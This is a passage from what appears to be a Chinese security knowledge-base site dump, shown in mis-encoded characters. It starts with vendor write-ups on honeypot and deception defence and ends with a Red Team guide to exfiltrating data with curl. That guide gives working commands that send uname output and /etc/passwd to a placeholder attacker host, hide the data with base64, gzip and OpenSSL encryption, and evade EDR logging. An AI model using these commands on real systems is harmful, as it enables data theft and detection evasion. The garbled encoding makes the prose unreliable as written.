çŸ¥è¯†åº“/Blue Teamèƒ½åŠ›å»ºè®¾/æ¬ºéª—é˜²å¾¡/é•¿äº­æ¬ºéª—è§£å†³æ–¹æ¡ˆ/","title":"é•¿äº­æ¬ºéª—è§£å†³æ–¹æ¡ˆ"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: é•¿äº­æ¬ºéª—è§£å†³æ–¹æ¡ˆ\r\ntags:\r\n- Blue Teamèƒ½åŠ›å»ºè®¾\r\n- æ¬ºéª—é˜²å¾¡\r\n- é•¿äº­\r\n---\r\n\r\n![cHIP7w](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/cHIP7w.jpg)\r\n![v1YfnP](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/v1YfnP.jpg)\r\n\r\né•¿äº­ç§‘æŠ€å…ˆæˆ˜è€Œåå¸ˆï¼Œå‡­å€Ÿç¡¬æ ¸å®æˆ˜èƒ½åŠ›ï¼Œåœ¨åŠ¨æ€å¯¹æŠ—ä¸­ç ”ç©¶æ”»å‡»è€…æœ€æ–°ã€æœ€é«˜é¢‘æ”»å‡»æ–¹å¼ä¸è·¯å¾„ï¼Œé’ˆå¯¹å®æˆ˜è¾“å‡ºæ¬ºéª—ä¼ªè£…ä¸“é¢˜ç§è´§ï¼ŒåŠ©åŠ›é˜²å®ˆè€…4é¡¹æˆ˜åŠ›å‡çº§ï¼Œè®©æ”»å‡»è€…ä¸ä»…æ— æ³•çŸ¥å½¼ï¼Œæ›´æ— æ³•çŸ¥å·±ï¼Œè¿·ç³Šåˆ°åº•ã€‚\r\n\r\n# æˆ˜åŠ›ä¸€ï¼Œç­–ç•¥å¸ƒé˜²ï¼Œæº¯æºååˆ¶æ˜¾å¨åŠ›\r\n- æˆåŠŸæº¯æºå¹¶ååˆ¶æ”»å‡»è€…ï¼Œæ˜¯é˜²å®ˆæ–¹æœ€ä¸ºè¿‡ç˜¾çš„æ—¶åˆ»ä¹‹ä¸€ã€‚â€œæˆä¹‹ä»¥é±¼ï¼Œä¸å¦‚æˆä¹‹ä»¥æ¸”â€œï¼Œé˜²å®ˆæ–¹äº†è§£æœ€æ–°ã€æœ€é«˜é¢‘æº¯æºå’Œååˆ¶æ–¹å¼çš„å®æˆ˜ç­–ç•¥å¸ƒé˜²åŸç†ï¼Œå¹¶å°†å…¶ç»“åˆå®é™…ä¸šåŠ¡ç¯å¢ƒè½åœ°ï¼Œæº¯æºååˆ¶å¨åŠ›å°†ä¸å¯é™é‡ã€‚\r\n- æº¯æºç­–ç•¥åŒ…æ‹¬æµè§ˆå™¨ã€webshellã€Burp Suite å’Œ Webrtc\r\n- ååˆ¶ç­–ç•¥åŒ…æ‹¬å®¢æˆ·ç«¯ã€Mysqlã€Gitã€æŸæ‰«æå™¨å’Œæµè§ˆå™¨çˆ¬è™«\r\n- **æº¯æºååˆ¶æ•ˆæœ**\r\n  - ![SzML0Y](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/SzML0Y.jpg)\r\n\r\n# æˆ˜åŠ›äºŒï¼Œè”åŠ¨æ‰©å¤§è¯±æ•èŒƒå›´ï¼Œè¯±æ•æ•ˆæœæ›´ä½³\r\n- è”åŠ¨WAFã€ä¸»æœºå®‰å…¨äº§å“ã€æ€æ„Ÿå¹³å°ç­‰\r\n\r\n# æˆ˜åŠ›ä¸‰ï¼Œæ–¹æ¡ˆåˆ›æ–° ï¼Œå¤§è§„æ¨¡èµ„äº§æ¬ºéª—ä¼ªè£…æ— å¿§\r\n- ä»¥æœ€å°‘çš„èµ„æºè§£å†³æ¬ºéª—èŠ‚ç‚¹è¦†ç›–åº¦é—®é¢˜ï¼Œé•¿äº­è°›å¬ï¼ˆD-Sensorï¼‰â€œå¤§æ¢é’ˆâ€å†…ç½®å¤šä¸ªç½‘å£ï¼Œå¯åŒæ—¶æ¥å…¥å¤šä¸ªç½‘ç»œåŒºåŸŸã€‚å…¶å•ä¸ªç½‘å£å¯é…ç½®å¤šä¸ª VLAN å’Œå¤šä¸ª IPï¼Œé€šè¿‡ Trunk æ¨¡å¼å°†å…¶æ¥å…¥åˆ°äº¤æ¢æœºä¸Šï¼Œå¯ä»¥åœ¨ä¸€ä¸ªç½‘ç»œåŒºåŸŸå†…å®ç°å¤šä¸ª IP å’Œå¤šä¸ªèœœç½ç»‘å®šï¼Œåœ¨èŠ‚çº¦èµ„æºã€æˆæœ¬çš„åŒæ—¶éƒ¨ç½²æ›´å¤šçš„ä¼ªè£…æ¬ºéª—èŠ‚ç‚¹ï¼Œè¿…é€Ÿæ‰©å¤§æ¬ºéª—èŒƒå›´ï¼Œå®ç°å¿«é€Ÿå¨èƒæ„ŸçŸ¥å’Œè¯±æ•ã€‚\r\n\r\n# æˆ˜åŠ›å››ï¼Œå®‰å…¨ä¸ºåŸºï¼Œè‡ªèº«ä¸æˆä¸ºæ”»å‡»è·³æ¿\r\n![xR0YRc](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/xR0YRc.jpg)\r\n\r\n1. æ¢é’ˆç›´æ¥è½¬å‘ï¼Œä¸å¯¹æµé‡è¿›è¡Œä»»ä½•åˆ†æå¤„ç†ã€‚æ”»å‡»è€…æ— æ³•ä»æ¢é’ˆå¼€æ”¾çš„ç«¯å£æ”»å‡»åˆ°æ¢é’ˆå®¿ä¸»æœºã€‚\r\n2. ç®¡ç†èŠ‚ç‚¹å¯¹æ¢é’ˆè®¾å¤‡ä½ä¿¡ä»»ï¼Œåªæ¥æ”¶ç›´æ¥è½¬å‘è¿‡æ¥çš„èœœç½æµé‡å’Œå…¶ä»–æ£€æµ‹ç»“æœã€‚å³ä½¿æ”»å‡»è€…é€šè¿‡å…¶ä»–æ–¹å¼æ”»é™·äº†æ¢é’ˆå®¿ä¸»æœºï¼Œä¹Ÿæ— æ³•è¿›ä¸€æ­¥æ”»å‡»åˆ°ç®¡ç†èŠ‚ç‚¹ã€‚\r\n3. ä¸¥å¯†çš„å®¹å™¨é€ƒé€¸é™åˆ¶ä¸æ£€æµ‹ï¼Œå³ä½¿æ”»å‡»è€…è·å–äº†èœœç½å®¹å™¨çš„æƒé™ï¼Œä¹Ÿä¸ä¼šå±å®³åˆ°å®¿ä¸»æœºçš„å®‰å…¨ã€‚\r\n4. é€šè¿‡å…³é—­èœœç½‘ä½¿ç”¨å®¿ä¸»æœºç½‘ç»œåŠŸèƒ½çš„æƒé™ï¼Œå½»åº•åˆ‡æ–­èœœç½åˆ°å…¶ä»–ç½‘ç»œçš„è®¿é—®è·¯å¾„ï¼Œç¡®ä¿èœœç½ä¸ä¼šæˆä¸ºè·³æ¿ã€‚\r\n5. å‰åç«¯åˆ†ç¦»ï¼Œå®Œå–„çš„èº«ä»½è®¤è¯ã€æ¸—é€æµ‹è¯•å’Œç½‘ç»œéš”ç¦»ï¼Œä½¿å¾—æ”»å‡»è€…æ— æ³•ä»å‰å°æ”»é™·ç®¡ç†èŠ‚ç‚¹å®¿ä¸»æœºã€‚\r\n\r\n# å‚è€ƒèµ„æ–™\r\n- [https://mp.weixin.qq.com/s/zgXsA-oYViCgJuOcWjiWJA](https://mp.weixin.qq.com/s/zgXsA-oYViCgJuOcWjiWJA)"},{"fields":{"slug":"/å®‰å…¨çŸ¥è¯†åº“/Blue Teamèƒ½åŠ›å»ºè®¾/æ¬ºéª—é˜²å¾¡/é˜¿é‡Œäº‘äº‘åŸç”Ÿèœœç½/","title":"é˜¿é‡Œäº‘äº‘åŸç”Ÿèœœç½"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: é˜¿é‡Œäº‘äº‘åŸç”Ÿèœœç½\r\ntags:\r\n- Blue Teamèƒ½åŠ›å»ºè®¾\r\n- æ¬ºéª—é˜²å¾¡\r\n- é˜¿é‡Œäº‘\r\n---\r\n\r\n![bGN1LZ](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/bGN1LZ.jpg)\r\n\r\n# å‚è€ƒèµ„æ–™\r\n- [https://mp.weixin.qq.com/s/qb62aPAyX6SOF2LwOebWKA](https://mp.weixin.qq.com/s/qb62aPAyX6SOF2LwOebWKA)"},{"fields":{"slug":"/å®‰å…¨çŸ¥è¯†åº“/Blue Teamèƒ½åŠ›å»ºè®¾/æ¬ºéª—é˜²å¾¡/é»˜å®‰ç§‘æŠ€æ¬ºéª—é˜²å¾¡ä½“ç³»/","title":"é»˜å®‰ç§‘æŠ€æ¬ºéª—é˜²å¾¡ä½“ç³»"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: é»˜å®‰ç§‘æŠ€æ¬ºéª—é˜²å¾¡ä½“ç³»\r\ntags:\r\n- Blue Teamèƒ½åŠ›å»ºè®¾\r\n- æ¬ºéª—é˜²å¾¡\r\n- é»˜å®‰ç§‘æŠ€\r\n---\r\n\r\n# å¦‚ä½•ä¿è¯æ¬ºéª—é˜²å¾¡çš„æ•ˆæœå’Œæœ‰æ•ˆæ€§ï¼Ÿ\r\næ¬ºéª—é˜²å¾¡çš„æ•ˆæœå’Œæœ‰æ•ˆæ€§å¯ä»¥ä»â€œè¦†ç›–é¢â€å’Œâ€œèåˆåº¦â€ä¸¤ä¸ªæ–¹é¢å…¥æ‰‹ã€‚æ¬ºéª—é˜²å¾¡èŠ‚ç‚¹è¦†ç›–é¢è¶Šå¤§ã€ä¸çœŸå®ç½‘ç»œçš„èåˆåº¦è¶Šé«˜ï¼Œæ•ˆæœè¶Šå¥½ã€‚\r\n\r\n- æ‰©å¤§è¦†ç›–é¢\r\n  - æ‰©å¤§æ¬ºéª—é˜²å¾¡èŠ‚ç‚¹çš„è¦†ç›–é¢éœ€è¦æŠ•å…¥å¤§é‡æˆæœ¬ï¼Œé»˜å®‰ç§‘æŠ€é€šè¿‡å¤šç§æ–¹æ¡ˆå®ç°ä½æˆæœ¬ã€å¿«é€Ÿã€å¤§é¢ç§¯çš„è¦†ç›–ã€‚\r\n  - ä¸åˆƒç”²è”åŠ¨ï¼šæœåŠ¡è¯±æ•\r\n    - åˆƒç”²æ˜¯é»˜å®‰ç§‘æŠ€è‡ªç ”çš„ç½‘ç»œæ”»å‡»å¹²æ‰°å‹åˆ¶ç³»ç»Ÿï¼Œå®ƒéƒ¨ç½²åœ¨äº’è”ç½‘å‡ºå£ï¼Œé€šè¿‡æ—è·¯é•œåƒæ–¹å¼éƒ¨ç½²ï¼Œå¯å°†â€œç©ºé—²å…¬ç½‘IPâ€çš„æ‰€æœ‰è®¿é—®æµé‡ï¼Œéƒ½è½¬å‘åˆ°èœœç½ï¼Œå®ç°äº’è”ç½‘å…¨éƒ¨çš„éä¸šåŠ¡IPä¸èœœç½å…³è”ã€‚æ­¤æ–¹æ¡ˆç”±åˆƒç”²ä¸å¹»é˜µè”åŠ¨å®ç°ï¼Œå¯å°†å¹»é˜µéƒ¨ç½²è‡³æ•°æ®ä¸­å¿ƒæœ¬åœ°æˆ–å…¬æœ‰äº‘ï¼Œæ”»å‡»è€…ä»¥ä¸ºæ”»å‡»äº†çœŸå®IPï¼Œå´ä¸çŸ¥â€œåº”ç”¨â€å®é™…åœ¨äº‘ä¸Šï¼Œå®ç°è°ƒè™ç¦»å±±ã€‚\r\n    - ![x4YUFu](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/x4YUFu.jpg)\r\n  - ä¸­ç»§èŠ‚ç‚¹\r\n    - é€šè¿‡Trunkæ–¹å¼å®ç°èœœç½‘çš„è·¨VLANè¦†ç›–ï¼Œå•å°ä¸­ç»§èŠ‚ç‚¹å³å¯è¦†ç›–å¯¹åº”æ±‡èšäº¤æ¢æœºä¸‹çš„æ‰€æœ‰VLANã€‚åˆ©ç”¨ç½‘ç»œä¸­ç©ºé—²IPå°†æ”»å‡»æµé‡è¯±å¯¼è‡³èœœç½å†…ï¼Œåœ¨èŠ‚çœéƒ¨ç½²æˆæœ¬çš„åŒæ—¶ï¼Œå®ç°èœœç½‘èŠ‚ç‚¹çš„å…¨é¢è¦†ç›–ï¼Œé¿å…èœœç½‘å› æˆæœ¬é—®é¢˜å‡ºç°é˜²å®ˆçœŸç©ºåŒºåŸŸã€‚\r\n    - ![9olmAl](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/9olmAl.jpg)\r\n  - ä¼ªè£…ä»£ç†/å¤šIPæ¨¡å¼\r\n    - åœ¨ä¸€å°ç©ºç™½è™šæ‹Ÿæœºä¸Šéƒ¨ç½²ä¼ªè£…ä»£ç†ï¼ˆAgentï¼‰ï¼ŒåŒæ—¶åœ¨æ­¤è™šæ‹Ÿæœºä¸Šç»‘å®šå¤šä¸ªIPï¼Œå½“æ”»å‡»è€…è®¿é—®åˆ°è¿™äº›IPæ—¶ï¼Œæµé‡å°†å…¨éƒ¨è¢«è½¬å‘åˆ°èœœç½ã€‚\r\n  - å¨èƒæƒ…æŠ¥ä¸é›†ä¸­ç®¡ç†\r\n    - é€šè¿‡å¨èƒæƒ…æŠ¥ä¸­å¿ƒä¸é›†ä¸­ç®¡ç†ä¸­å¿ƒï¼Œå°†æ”»å‡»è€…ä¿¡æ¯ã€è¸ªè¿¹ã€æ”»å‡»è½¨è¿¹ã€èœœç½è®¾å¤‡ç­‰è¿›è¡Œé›†ä¸­ç®¡ç†ä¸é›†ä¸­å±•ç¤ºã€‚\r\n- æé«˜èåˆåº¦\r\n  - è¦†ç›–é¢å¯ä»¥å¢åŠ æˆåŠŸè¯±æ•æ”»å‡»è€…çš„æ¦‚ç‡ã€‚ä½†å‡å¦‚æ”»å‡»è€…è§¦è¾¾çœŸå®çš„ä¸šåŠ¡ç³»ç»Ÿï¼Œèƒ½å¦è¯±æ•æˆåŠŸï¼Œå°±éœ€è¦çœ‹èœœç½‘ä¸çœŸå®ç½‘ç»œçš„èåˆåº¦ï¼Œæ˜¯å¦åšåˆ°äº†â€œä½ ä¸­æˆ‘æœ‰ã€æˆ‘ä¸­æœ‰ä½ â€ã€‚\r\n  - ä¸åˆƒç”²è”åŠ¨ï¼šç½‘ç«™è¯±\r\n    - é€šè¿‡æ—è·¯éƒ¨ç½²åˆƒç”²ï¼Œå¹¶æ¥å…¥äº¤æ¢æœºç«¯å£é•œåƒï¼Œå¯ä¸ºçœŸå®ä¸šåŠ¡æ—è·¯æ’å…¥æ”»å‡»è€…æ„Ÿå…´è¶£çš„URLï¼Œç²¾å‡†æ•è·å…¶å¯¹çœŸå®ä¸šåŠ¡çš„æ”»å‡»è¡Œä¸ºã€‚\r\n  - ä¼ªè£…ä»£ç†/èåˆæ¨¡å¼\r\n    - å°†ä¼ªè£…ä»£ç†éƒ¨ç½²åœ¨çœŸå®ä¸šåŠ¡æœåŠ¡å™¨ä¸Šï¼Œå¹¶å¯ç”¨è™šå‡æœåŠ¡ç«¯å£ï¼Œå½“æ”»å‡»è€…æ”»å‡»åˆ°æ­¤ç«¯å£æ—¶ï¼Œæµé‡å°†è¢«è½¬å‘åˆ°èœœç½ã€‚\r\n  - æ²™ç®±å®šåˆ¶\r\n    - é»˜å®‰ç§‘æŠ€æä¾›çš„å®šåˆ¶æœåŠ¡ï¼Œå¯æ ¹æ®ç”¨æˆ·ä¸šåŠ¡ç‰¹ç‚¹ï¼Œå®šåˆ¶ä¸“å±çš„ä»¿çœŸèœœç½ï¼Œè®©æ”»å‡»è€…åˆ†ä¸æ¸…çœŸå‡ã€‚\r\n  - è¿è¥æœåŠ¡\r\n    - æ¬ºéª—é˜²å¾¡æ˜¯åœ¨æ”»å‡»è€…çš„å¿…ç»ä¹‹è·¯ä¸Šéƒ¨ç½²é™·é˜±ï¼Œå¯¹æ”»å‡»è€…è¿›è¡Œè¯±æ•ã€‚é‚£ä¹ˆï¼Œæ”»å‡»è€…çš„å¿…ç»ä¹‹è·¯æ˜¯ä»€ä¹ˆï¼Ÿé»˜å®‰ç§‘æŠ€æä¾›æ¬ºéª—é˜²å¾¡çš„å®‰å…¨è¿è¥æœåŠ¡ï¼Œé€šè¿‡æ”»å‡»è€…è§†è§’å¯¹ç›®æ ‡ä¼ä¸šè¿›è¡Œâ€œæ‘¸åº•â€ï¼Œé‡èº«å®šåˆ¶éƒ¨ç½²æ–¹æ¡ˆï¼Œç»“åˆè¿è¥æœåŠ¡ï¼Œå¯¹æ”»å‡»è€…è¿›è¡Œç²¾å‡†è¯±æ•ã€‚\r\n\r\n# å¦‚ä½•å°†æ¬ºéª—é˜²å¾¡è¿ç”¨åœ¨å¸¸æ€åŒ–çš„å®‰å…¨è¿è¥ä¸­ï¼Œè€Œéâ€œæ”»é˜²æ¼”ç»ƒä¸“ç”¨â€\r\n- ç”±äºæ¬ºéª—é˜²å¾¡åœ¨è¿‘å‡ å¹´å¤§å‹æ”»é˜²æ¼”ç»ƒä¸­çš„å‡ºè‰²è¡¨ç°ï¼Œä¸šç•Œå‡ºç°äº†ä¸€äº›â€œæ¬ºéª—é˜²å¾¡æ˜¯æ”»é˜²æ¼”ç»ƒä¸“ç”¨â€çš„å£°éŸ³ã€‚å…¶å®ä¸ç„¶ï¼Œæ¬ºéª—é˜²å¾¡åœ¨å¸¸æ€åŒ–çš„å®‰å…¨è¿è¥ä¸­æœ‰ç€ä¸å¯å°è§‘çš„ä»·å€¼ã€‚\r\n- è¡¥å……ç°æœ‰æ£€æµ‹èƒ½åŠ›çš„ä¸è¶³ï¼Œå‘ç°æœªçŸ¥å¨èƒ\r\n  - ç°æœ‰å®‰å…¨æ£€æµ‹äº§å“å¤§å¤šåŸºäºé»‘åå•æˆ–ç­¾åæ¥æ£€æµ‹å·²çŸ¥å¨èƒï¼Œé’ˆå¯¹æœªçŸ¥å¨èƒçš„æœ‰æ•ˆè§£å†³æ–¹æ¡ˆæå°‘ã€‚é»˜å®‰ç§‘æŠ€åˆƒç”²äº§å“é¦–å…ˆé€šè¿‡å¾®èœœç½åŠŸèƒ½ç²¾å‡†é”å®šæ”»å‡»è€…ï¼Œå†æŠ“å–ä¸å…¶ç›¸å…³çš„å…¨éƒ¨æµé‡ï¼ŒååŠ©å®‰å…¨äººå‘˜åˆ†æï¼Œæ•è·0dayæ”»å‡»ã€‚\r\n- æ¬ºéª—é˜²å¾¡ä½“ç³»æ˜¯ä¼ä¸šå®‰å…¨çš„ä¸€é“é‡è¦é˜²çº¿\r\n  - æ”»å‡»è€…çªç ´åˆ°å†…ç½‘çš„æ–¹å¼å¾ˆå¤šï¼Œä½†å¯¹0dayã€ç¤¾å·¥ç­‰æ”»å‡»æ–¹å¼é˜²ä¸èƒœé˜²ã€‚è¿™æ—¶å¯¹é˜²å®ˆæ–¹æ¥è¯´ï¼Œæƒ³è¦åŠæ—¶â€œæ­¢æŸâ€ï¼Œæœ€å¥½çš„åŠæ³•å°±æ˜¯èƒ½å°½æ—©å‘ç°æ”»å‡»è€…ï¼Œæ‰¾å‡ºè¢«æ§ä¸»æœºã€‚æ¬ºéª—é˜²å¾¡ä½“ç³»èƒ½å¤Ÿåœ¨å†…ç½‘éƒ¨ç½²å¤§é‡æ¬ºéª—èŠ‚ç‚¹ï¼Œå¹¶ä½¿èœœç½‘ä¸çœŸå®ä¸šåŠ¡ç½‘ç»œèåˆã€‚æ”»å‡»è€…é‡‡ç”¨ä»»æ„æ”»å‡»æ–¹å¼ã€ä»ä»»æ„ç½‘æ®µä¾µå…¥ï¼Œä¸ºäº†æ‰©å¤§æˆ˜æœï¼Œéƒ½ä¼šåšæ¨ªå‘ç§»åŠ¨ï¼Œæ­¤æ—¶å°±ä¼šæ‰å…¥å·²éƒ¨ç½²çš„é™·é˜±ä¹‹ä¸­ã€‚\r\n- å»ºç«‹ç§æœ‰å¨èƒæƒ…æŠ¥å¹³å°ï¼Œè”é˜²è”æ§\r\n  - æ”»å‡»è€…åœ¨æ”»å‡»æ—¶ï¼Œå¾€å¾€ä¼šå…ˆæ”»å‡»åˆ†æ”¯ç›¸å¯¹è„†å¼±çš„ç‚¹ï¼Œå†é€šè¿‡åˆ†æ”¯ä½œä¸ºè·³æ¿ï¼Œå¯¹æ€»éƒ¨è¿›è¡Œæ”»å‡»ã€‚å¹¶ä¸”å¯èƒ½ä¼šåœ¨æ•´ä¸ªæ”»å‡»è¿‡ç¨‹ä¸­æ›´æ¢å¤šä¸ªIPï¼Œä½¿é˜²å®ˆè€…æ— æ³•è¿˜åŸæ•´ä½“æ”»å‡»è·¯å¾„ï¼Œåªèƒ½è¢«åŠ¨é˜²å®ˆã€‚\r\n  - æ¬ºéª—æŠ€æœ¯æœ€å¤§çš„ç‰¹ç‚¹å°±æ˜¯ç²¾å‡†æ£€æµ‹ã€‚é»˜å®‰ç§‘æŠ€èƒ½å¤Ÿä¸ºç”¨æˆ·å»ºè®¾æ¬ºéª—é˜²å¾¡ä½“ç³»ï¼Œåœ¨æ€»éƒ¨æ­å»ºå¨èƒæƒ…æŠ¥å¹³å°ï¼Œé€šè¿‡è®¾å¤‡æŒ‡çº¹é”å®šæ”»å‡»è€…ï¼Œå°†å…¶ä½¿ç”¨è¿‡çš„å…¨éƒ¨IPè¿›è¡Œå½’å¹¶ã€‚åœ¨å…¶æ”»å‡»ä¸€ä¸ªåˆ†æ”¯èŠ‚ç‚¹æ—¶ï¼Œæ€»éƒ¨åŠå…¶ä»–çš„åˆ†æ”¯èŠ‚ç‚¹å¯è¿›è¡Œé¢„è­¦ï¼Œåšåˆ°äº‹å‰å¤„ç½®ï¼Œå½¢æˆæ•´ä½“çš„è”é˜²è”æ§æœºåˆ¶ã€‚\r\n\r\n# å‚è€ƒèµ„æ–™\r\n- [https://mp.weixin.qq.com/s/gcFwMr6z9P_RoSmb0S0rIg](https://mp.weixin.qq.com/s/gcFwMr6z9P_RoSmb0S0rIg)"},{"fields":{"slug":"/å®‰å…¨çŸ¥è¯†åº“/Red Teamèƒ½åŠ›å»ºè®¾/æ•°æ®å¤–ä¼  Exfiltration/Curlå‘½ä»¤æ•°æ®å¤–ä¼ æŠ€å·§/","title":"Curlå‘½ä»¤æ•°æ®å¤–ä¼ æŠ€å·§"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: Curlå‘½ä»¤æ•°æ®å¤–ä¼ æŠ€å·§\r\ntags:\r\n- Red Teamèƒ½åŠ›å»ºè®¾\r\n- æ•°æ®å¤–ä¼  Exfiltration\r\n---\r\n\r\n# åŸºæœ¬å½¢å¼\r\n```bash\r\n  å—æ§æœº\r\n  curl -d `uname -a` http://attacker_system/\r\n  \r\n  æ¥æ”¶æœº\r\n  nc -lp 80\r\n  POST / HTTP/1.1\r\n  Host: attacker_system\r\n  User-Agent: curl/7.68.0\r\n  Accept: */*\r\n  Content-Length: 31\r\n  Content-Type: application/x-www-form-urlencoded\r\n  \r\n  Linux 25b01d656003 5.10.47-linuxkit #1 SMP Sat Jul 3 21:51:47 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux\r\n  \r\n```\r\n\r\n# å„ç§æ··æ·†\r\n```\r\n  å—æ§æœº\r\n  curl -d `cat /etc/passwd | base64 -w0` http://attacker_system/\r\n  curl http://attacker_system/`uname -a | base64 -w0`\r\n  curl http://attacker_system/ -H  \"Cookie: `uname -a | base64 -w0`\"\r\n  curl -d `uname -a | gzip | base64 -w0` http://attacker_system\r\n  curl -d `uname -a | gzip | xxd -ps | tr -d '\\n'` http://attacker_system/\r\n```\r\n\r\n# OpenSSLåŠ å¯†\r\n```\r\n  å—æ§æœº\r\n  curl -d `uname -a | openssl enc -pass 'pass:EncryptMe' -md sha256 -aes-256-cbc -pbkdf2 -a -e` http://attacker_system/\r\n  \r\n  æ¥æ”¶æœº\r\n  nc -lp 80\r\n  POST / HTTP/1.1\r\n  Host: attacker_system\r\n  User-Agent: curl/7.68.0\r\n  Accept: */*\r\n  Content-Length: 172\r\n  Content-Type: application/x-www-form-urlencoded\r\n  \r\n  U2FsdGVkX18/C90HEEv7tvzvU7JM/FRUQ9cGlhC5QporjmRYBwMLNc/VBbrOQFqp6GPQRu1T99GfwZUwDgOU8sItii//UAs4WoAxpVRcAg3cHOYKJ+ZUA3X4lS2Af/2J3zPKHeL6E3559Ife9X0hBk5zjfSfmFM00es2DTVYm+Q=\r\n```\r\n\r\nå¦‚ä¸Šæ‰€ç¤ºï¼Œæˆ‘ä»¬ä½¿ç”¨curlPOST å¯¹uname -a è¿›è¡Œæ•°æ®å¤–ä¼ ï¼Œä½¿ç”¨ç®¡é“å°† stdout å‘é€åˆ°opensslï¼Œä½¿ç”¨å¯†ç åŠ å¯†ã€‚ä½†éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™ç§æ–¹æ³•ä¼šåœ¨è¿›ç¨‹æ ‘çš„å‘½ä»¤è¡Œå‚æ•°ä¸­æ˜¾ç¤ºå¯†ç ï¼ŒæŸäº›EDRå¯èƒ½ä¼šæ•è·è¿™äº›å‚æ•°ä»¥ä¾›ä»¥ååˆ†æã€‚æœ€åï¼Œæˆ‘ä»¬å¯¹è¾“å‡ºè¿›è¡Œbase64ç¼–ç å¹¶å‘é€è¯·æ±‚ã€‚ä»¥ä¸‹æ˜¯opensslçš„ä¸€äº›å‚æ•°è§£é‡Šï¼š\r\n\r\n- encè¯¥å‘½ä»¤å…è®¸æˆ‘ä»¬ä½¿ç”¨å¯†ç æ¥åŠ å¯†æ•°æ®ã€‚\r\n- -passè¯¥å‚æ•°å…è®¸æˆ‘ä»¬æŒ‡å®šå¯†ç æ¥åŠ å¯†æ•°æ®ã€‚\r\n- -mdç”¨äºä»æä¾›çš„å¯†ç åˆ›å»ºå¯†é’¥çš„æ¶ˆæ¯æ‘˜è¦ç®—æ³•ã€‚OpenSSL å¯èƒ½ä¼šæ ¹æ®å®‰è£…é»˜è®¤ä½¿ç”¨ä¸åŒçš„æ¶ˆæ¯æ‘˜è¦ç®—æ³•ï¼Œä¸ºäº†é¿å…è§£å¯†å‡ºç°é—®é¢˜ï¼Œæœ€å¥½ä¸“é—¨è®¾ç½®æ­¤å‚æ•°ã€‚\r\n- -aes-256-cbcæˆ‘ä»¬å¸Œæœ›ç”¨æ¥åŠ å¯†æ•°æ®çš„ç®—æ³•ã€‚\r\n- -pbkdf2ä½¿ç”¨å…·æœ‰é»˜è®¤è¿­ä»£æ¬¡æ•°ï¼ˆé€šå¸¸ä¸º 10000 æ¬¡è¿­ä»£ï¼‰çš„ PBKDF2 ç®—æ³•ã€‚è¿™æ˜¯ä¸€ä¸ªæ¯”é»˜è®¤é€‰é¡¹ openssl æä¾›çš„æ›´å®‰å…¨çš„å¯†é’¥æ´¾ç”Ÿè¿‡ç¨‹ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™ä¸ªæ ‡å¿—åªåœ¨ OpenSSL >= 1.1.1 ä¸­å¯ç”¨ã€‚\r\n- -aå°†è¾“å‡ºç¼–ç ä¸º Base64ã€‚è¿™è®©æˆ‘ä»¬å¯ä»¥base64 -w0åƒä¹‹å‰æ‰€åšçš„é‚£æ ·è·³è¿‡ç®¡é“ã€‚\r\n- -eæœ€åï¼Œè¿™ä¸ªæ ‡å¿—å‘Šè¯‰ openssl åŠ å¯†ä¼ é€’ç»™å®ƒçš„æ•°æ®ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ•°æ®æ¥è‡ªæ ‡å‡†è¾“å…¥ã€‚\r\n- ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•è¿›è¡Œè§£å¯†\r\n\r\n  ```\r\n    openssl enc -pass 'pass:EncryptMe' -md sha256 -aes-256-cbc -pbkdf2 -a -d <<< U2FsdGVkX18/C90HEEv7tvzvU7JM/FRUQ9cGlhC5QporjmRYBwMLNc/VBbrOQFqp6GPQRu1T99GfwZUwDgOU8sItii//UAs4WoAxpVRcAg3cHOYKJ+ZUA3X4lS2Af/2J3zPKHeL6E3559Ife9X0hBk5zjfSfmFM00es2DTVYm+Q= \r\n    Linux 25b01d656003 5.10.47-linuxkit #1 SMP Sat Jul 3 21:51:47 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux\r\n  ```\r\n\r\n## é‚£ä¹ˆå¦‚ä½•å°†è¿›ç¨‹æ ‘å‘½ä»¤è¡Œå‚æ•°ä¸­çš„å¯†ç éšè—å‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è‡ªå·±çš„å…¬é’¥è¿›è¡ŒåŠ å¯†\r\n```\r\n  å—æ§æœº\r\n  curl -k -d `openssl s_client -connect attacker_system:443 \\\r\n  | openssl x509 -pubkey -noout  > /tmp/f; uname -a \\\r\n  | openssl rsautl -inkey /tmp/f -pubin -encrypt \\\r\n  | base64 -w0; rm /tmp/f` https://attacker_system/\r\n  \r\n  æ¥æ”¶æœº\r\n  ncat -lp 443 -k --ssl --ssl-cert pub.crt --ssl-key priv.key\r\n  POST / HTTP/1.1\r\n  Host: attacker_system\r\n  User-Agent: curl/7.68.0\r\n  Accept: */*\r\n  Content-Length: 344\r\n  Content-Type: application/x-www-form-urlencoded\r\n  \r\n  HmuUgK05Sku7xBjBkxDeakgDnb9CkJIX5EYIC1oxOnSHxBzVG9hGh4BQeX9VwEp5OYxLX8mRNXCxmbHANdwy3/Bga4Mp+GFVhUZKr8haKHVrNa1dtfEvHlmDaMfESwcZy0Llmvl8+skOescVb6lSZLS/09HIAVdfyQo5DFM59KKGm9XZEMsXUAvR+1AmB5nsvIAKqBQY1nyr5IJc6+pzSK8d1gxTCTL/0D9gM2xnr6ZXmgthPogH2dy8olZLlYT+q6J/3ZpDijm1W4LyKZHO0WLjdS0mem9to/6GAi8cWZTySV+BvddF3jmkA8lfgOtL09JpjC9QrJ5sT7Ay+vDWuA==\r\n```\r\n\r\n- 